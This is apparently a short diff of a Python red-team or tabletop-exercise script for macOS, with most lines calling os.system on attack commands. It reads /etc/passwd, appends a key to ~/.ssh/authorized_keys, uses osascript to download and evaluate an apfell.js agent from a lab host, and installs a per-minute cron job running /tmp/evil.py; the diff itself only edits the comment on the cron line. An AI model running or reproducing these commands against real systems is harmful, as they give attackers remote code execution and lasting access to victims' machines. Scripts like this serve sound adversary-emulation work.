@@ -8,4 +8,4 @@ os.system('dscl . ls /Groups')
 os.system('cat /etc/passwd')
 os.system('echo "tabletop_key_value" >> ~/.ssh/authorized_keys')
 os.system("osascript -l JavaScript -i eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://sec-lab-kali.test.env:2222/apfell.js')),$.NSUTF8StringEncoding )));")
-os.system('echo "* * * * * /bin/bash -c \"/tmp/evil.py\"" | crontab -') #for deletion >crontab -l 
+os.system('echo "* * * * * /bin/bash -c \"/tmp/evil.py\"" | crontab -') #for deletion >crontab -r
